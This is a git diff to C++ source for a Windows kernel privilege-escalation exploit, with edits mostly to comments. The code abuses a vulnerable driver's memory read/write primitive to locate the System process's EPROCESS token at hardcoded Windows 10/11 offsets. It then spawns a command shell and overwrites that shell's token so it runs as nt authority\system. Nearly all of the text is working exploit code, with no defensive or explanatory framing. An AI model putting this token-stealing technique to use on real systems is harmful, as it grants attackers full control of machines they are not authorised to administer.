@@ -26,6 +26,7 @@ int main() {
         return -1;
     }
 
+    // Call NtQuerySystemInformation and ask for the System module list.
     if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 11, ModuleInfo, 1024 * 1024,
                                                       NULL))) // 11 = SystemModuleInformation
     {
@@ -37,6 +38,7 @@ int main() {
     }
 
     // Iterate through module list till we find the Kernel base address.
+    // We do this by iterating through the list till we find a module named "ntoskrnl.exe" - this is the Kernel.
     for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
         if (!strcmp((const char *) ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName,
                     "ntoskrnl.exe")) {
@@ -45,16 +47,19 @@ int main() {
         }
     }
 
+    // Clear that buffer now we don't need it.
     VirtualFree(ModuleInfo, 0, MEM_RELEASE);
 
     std::cout << "[>] ntoskrnl.exe base address: " << std::hex << ntoskrnlBaseAddress << std::dec << std::endl;
 
+    // These tokens will need updating if you are on a different version of Windows!
+    // The offsets can be found here: https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
     uintptr_t TokenOffset = 0x04B8; // Windows 10 21H2+ and Windows 11 only
     uintptr_t PIDOffset = 0x0440; // Windows 10 21H2+ and Windows 11 only
     uintptr_t ActiveProcessLinksOffset = 0x0448; // Windows 10 21H2+ and Windows 11 only
 
     // Fetch Kernel EPROCESS/KPROCESS
-    // Get NTOS module address
+    // Get NTOS module address by loading it
     HMODULE ntos = LoadLibrary("ntoskrnl.exe");
     // Get function address
     auto PsInitialSystemProcessOffsetAddr = (uint64_t) GetProcAddress(ntos, "PsInitialSystemProcess");
@@ -62,7 +67,7 @@ int main() {
     auto offset = PsInitialSystemProcessOffsetAddr - (uint64_t) ntos;
     // Rebase to get Kernel address
     auto realPsInitialSystemProcessAddr = offset + ntoskrnlBaseAddress;
-    // Read the EPROCESS pointer to get real address
+    // Read the EPROCESS pointer to get real address using our exploit
     uint64_t PsInitialSystemProcessEPROCESS;
     Driver.read_memory_raw(
             (void *) realPsInitialSystemProcessAddr,
@@ -74,7 +79,7 @@ int main() {
     std::cout << "[>] PsInitialSystemProcess EPROCESS Address: " << std::hex << PsInitialSystemProcessEPROCESS
               << std::dec << std::endl;
 
-    // Get the PID of the System
+    // Read the PID of the System
     DWORD systemPID;
     Driver.read_memory_raw(
             (void *) (PsInitialSystemProcessEPROCESS + PIDOffset),
@@ -83,10 +88,10 @@ int main() {
             processHandle
     );
 
-    // This is always 4.
+    // This is usually always 4.
     std::cout << "[>] System PID: " << systemPID << std::endl;
 
-    // Steal the System process token address.
+    // Steal the System process token address using our exploit.
     uint64_t SystemToken;
     Driver.read_memory_raw(
             (void *) (PsInitialSystemProcessEPROCESS + TokenOffset),
@@ -96,7 +101,7 @@ int main() {
     );
     std::cout << "[>] System Token: " << std::hex << SystemToken << std::dec << std::endl;
 
-    // Spawn a new shell and fetch its PID. We will elevate this shell to nt authority\system.
+    // Spawn a new shell and save its PID. We will elevate this shell to nt authority\system.
     std::cout << "[-] Spawning a new shell that will be elevated to nt authority\\system!" << std::endl;
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi;
@@ -151,7 +156,7 @@ int main() {
             );
             std::cout << "[>] Found our shell's current Process Token: " << std::hex << OurShellsToken << std::dec
                       << std::endl;
-            // Overwrite our shell's Process Token with the System's Process Token, to give us our newfound powers.
+            // Overwrite our shell's Process Token with the System's Process Token, to elevate our privilege!
             Driver.read_memory_raw(
                     (void *) &SystemToken,
                     (void *) (NextProcessEPROCESSBlock + TokenOffset),
@@ -169,6 +174,7 @@ int main() {
         );
     }
 
+    // Done!
     std::cout << "[$] The newly opened shell should now be running as nt authority\\system!" << std::endl;
 
     // Close the handles.
